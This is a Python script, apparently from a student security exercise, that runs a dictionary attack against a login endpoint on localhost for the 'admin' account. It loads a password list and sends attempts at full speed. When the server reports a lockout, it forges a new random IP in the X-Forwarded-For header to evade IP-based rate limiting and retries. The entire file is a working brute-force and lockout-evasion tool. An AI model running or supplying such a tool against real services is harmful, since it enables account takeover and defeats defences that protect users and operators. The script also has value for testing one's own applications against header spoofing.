import requests
import time
import random

# Configuration
TARGET_URL = "http://127.0.0.1:4500/login"
USERNAME = "admin"
PASSWORD_FILE = "/home/dawng/Desktop/Code/school/python/anm/passwords.txt"
DELAY = 0  # No delay - maximum speed

def generate_fake_ip():
    """Generate a random fake IP address"""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def load_passwords(file_path):
    """Load passwords from dictionary file"""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"Error: Password file not found at {file_path}")
        return []

def attempt_login(username, password, fake_ip):
    """Attempt to login with given credentials using a fake IP"""
    try:
        # Send fake IP in X-Forwarded-For header
        headers = {
            'Content-Type': 'application/json',
            'X-Forwarded-For': fake_ip
        }
        response = requests.post(
            TARGET_URL,
            json={"username": username, "password": password},
            headers=headers,
            timeout=5
        )
        return response.json(), response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return None, None

def dictionary_attack_with_ip_rotation():
    """Perform dictionary attack with IP rotation to bypass IP-based rate limiting"""
    print(f"{'='*60}")
    print(f"Dictionary Attack Tool - SMART IP ROTATION MODE")
    print(f"{'='*60}")
    print(f"Target: {TARGET_URL}")
    print(f"Username: {USERNAME}")
    print(f"Dictionary: {PASSWORD_FILE}")
    print(f"Strategy: Use same IP until locked, then rotate to new IP")
    print(f"{'='*60}\n")
    
    # Load passwords
    passwords = load_passwords(PASSWORD_FILE)
    if not passwords:
        return
    
    print(f"Loaded {len(passwords)} passwords from dictionary\n")
    print(f"Starting attack with smart IP rotation...\n")
    
    attempt_count = 0
    start_time = time.time()
    ip_changes = 0
    
    # Start with first fake IP
    current_ip = generate_fake_ip()
    ip_changes += 1
    requests_with_current_ip = 0
    
    print(f"[INFO] Using IP: {current_ip}\n")
    
    i = 0
    while i < len(passwords):
        password = passwords[i]
        attempt_count += 1
        requests_with_current_ip += 1
        
        # Attempt login with current IP
        result, status_code = attempt_login(USERNAME, password, current_ip)
        
        if result is None:
            i += 1
            continue
        
        # Print attempt info
        print(f"[{attempt_count:04d}] IP: {current_ip:15s} Testing: {password:20s} ", end='')
        
        if result.get('status') == 'success':
            print(f"✓ SUCCESS!")
            print(f"\n{'='*60}")
            print(f"PASSWORD FOUND!")
            print(f"{'='*60}")
            print(f"Username: {USERNAME}")
            print(f"Password: {password}")
            print(f"Used IP: {current_ip}")
            print(f"{'='*60}\n")
            break
        elif 'locked' in result.get('message', '').lower() or status_code == 403:
            print(f"✗ LOCKED")
            # IP is locked, rotate to new IP
            old_ip = current_ip
            current_ip = generate_fake_ip()
            ip_changes += 1
            print(f"[INFO] IP {old_ip} blocked after {requests_with_current_ip} requests")
            print(f"[INFO] Rotating to new IP: {current_ip}")
            print(f"[INFO] Retrying password '{password}' with new IP\n")
            requests_with_current_ip = 0
            # Don't increment i - retry this password with new IP
            continue
        else:
            print(f"✗ Failed")
            i += 1  # Move to next password
        
        # Delay between requests
        time.sleep(DELAY)
    
    else:
        print(f"\n{'='*60}")
        print(f"Password not found in dictionary")
        print(f"{'='*60}\n")
    
    # Statistics
    elapsed_time = time.time() - start_time
    print(f"Statistics:")
    print(f"Total attempts: {attempt_count}")
    print(f"IP addresses used: {ip_changes}")
    print(f"Time elapsed: {elapsed_time:.2f} seconds")
    print(f"Average rate: {attempt_count/elapsed_time:.2f} attempts/second")

if __name__ == "__main__":
    try:
        dictionary_attack_with_ip_rotation()
    except KeyboardInterrupt:
        print(f"\n\nAttack interrupted by user")
    except Exception as e:
        print(f"\nError: {e}")
